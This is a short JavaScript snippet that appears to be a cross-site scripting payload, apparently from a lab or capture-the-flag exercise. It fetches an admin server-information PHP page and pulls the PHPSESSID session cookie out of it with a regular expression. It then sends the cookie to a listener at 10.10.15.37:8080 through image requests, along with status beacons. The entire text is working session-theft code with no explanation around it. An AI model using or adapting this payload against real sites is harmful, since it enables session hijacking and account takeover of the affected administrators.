new Image().src = 'http://10.10.15.37:8080/js-ran';
fetch('/skins_app_admin_server_info.php')
  .then(r => r.text())
  .then(t => {
    const m = t.match(/_COOKIE\['PHPSESSID'\]<\/td><td class="v">([a-z0-9]+)/);
    new Image().src = 'http://10.10.15.37:8080/cookie?' + (m ? m[1] : 'NOMATCH');
  })
  .catch(e => { new Image().src = 'http://10.10.15.37:8080/fetch-failed'; });
